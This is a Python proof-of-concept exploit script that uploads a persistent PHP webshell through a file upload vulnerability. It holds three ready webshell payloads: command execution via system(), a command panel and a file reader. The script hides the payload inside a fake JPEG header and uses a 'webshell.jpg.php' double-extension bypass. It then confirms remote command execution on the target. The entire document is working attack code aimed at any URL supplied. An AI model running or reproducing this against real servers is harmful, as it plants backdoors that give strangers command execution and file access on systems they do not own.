#!/usr/bin/env python3
"""
Persistent Webshell Upload Exploit
Demonstrates creating a persistent backdoor via file upload vulnerability
"""

import requests
import io
import re
import sys

def create_webshell(shell_type='basic'):
    """Create different types of webshells"""
    
    shells = {
        'basic': b'''<?php
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "Webshell active";
}
?>''',
        
        'advanced': b'''<?php
$pwd = getcwd();
echo "Current directory: " . $pwd . "<br>";
echo "PHP Version: " . phpversion() . "<br>";
echo "User: " . get_current_user() . "<br>";

if (isset($_GET['cmd'])) {
    echo "<h3>Command: " . htmlspecialchars($_GET['cmd']) . "</h3>";
    echo "<pre>";
    system($_GET['cmd'] . ' 2>&1');
    echo "</pre>";
} elseif (isset($_POST['cmd'])) {
    echo "<pre>";
    system($_POST['cmd'] . ' 2>&1');
    echo "</pre>";
}

echo "<hr>";
echo "<h3>Available Commands:</h3>";
echo "<a href='?cmd=whoami'>whoami</a> | ";
echo "<a href='?cmd=id'>id</a> | ";
echo "<a href='?cmd=pwd'>pwd</a> | ";
echo "<a href='?cmd=ls+-la'>ls -la</a><br>";
echo "<form method='GET'>";
echo "Command: <input type='text' name='cmd'>";
echo "<input type='submit' value='Execute'>";
echo "</form>";
?>''',
        
        'file_manager': b'''<?php
if (isset($_GET['file'])) {
    echo "<pre>";
    readfile($_GET['file']);
    echo "</pre>";
}
if (isset($_GET['dir'])) {
    echo "Files in " . $_GET['dir'] . ":<br>";
    foreach (scandir($_GET['dir']) as $f) {
        if ($f != '.' && $f != '..') {
            echo $f . " ";
        }
    }
}
echo "<form>";
echo "File: <input name='file'><input type='submit'>";
echo "</form>";
echo "<form>";
echo "Directory: <input name='dir'><input type='submit'>";
echo "</form>";
?>''',
    }
    
    return shells.get(shell_type, shells['basic'])

def upload_webshell(target_url, shell_type='basic'):
    """Upload webshell via file upload vulnerability"""
    
    jpg_header = b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    jpg_footer = b'\xFF\xD9'
    
    shell_code = create_webshell(shell_type)
    payload = jpg_header + shell_code + jpg_footer
    
    # Upload with double extension bypass
    files = {'userfile': ('webshell.jpg.php', io.BytesIO(payload), 'image/jpeg')}
    data = {'submit': 'Upload Image'}
    
    print(f"[*] Uploading {shell_type} webshell...")
    response = requests.post(f'{target_url}/index.php', files=files, data=data)
    
    match = re.search(r"href=['\"]([^'\"]*\.jpg\.php)['\"]", response.text)
    if match:
        upload_path = match.group(1)
        shell_url = f'{target_url}/{upload_path}'
        print(f"[+] Webshell uploaded to: {shell_url}")
        return shell_url
    
    return None

def test_webshell(shell_url, command='id'):
    """Test webshell execution"""
    
    print(f"[*] Testing webshell with command: {command}")
    response = requests.get(shell_url, params={'cmd': command})
    
    if 'uid=' in response.text or 'www-data' in response.text:
        print("[+] Webshell is active and functional!")
        # Extract output
        lines = response.text.split('<pre>')
        if len(lines) > 1:
            output = lines[1].split('</pre>')[0]
            print(f"[+] Output: {output}")
        return True
    
    return False

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python3 poc_persistent_webshell.py <target_url> [shell_type]")
        print("Shell types: basic, advanced, file_manager")
        sys.exit(1)
    
    target = sys.argv[1]
    shell_type = sys.argv[2] if len(sys.argv) > 2 else 'basic'
    
    shell_url = upload_webshell(target, shell_type)
    if shell_url:
        test_webshell(shell_url)
        print(f"\n[+] Persistent webshell ready!")
        print(f"[+] Access at: {shell_url}?cmd=COMMAND")
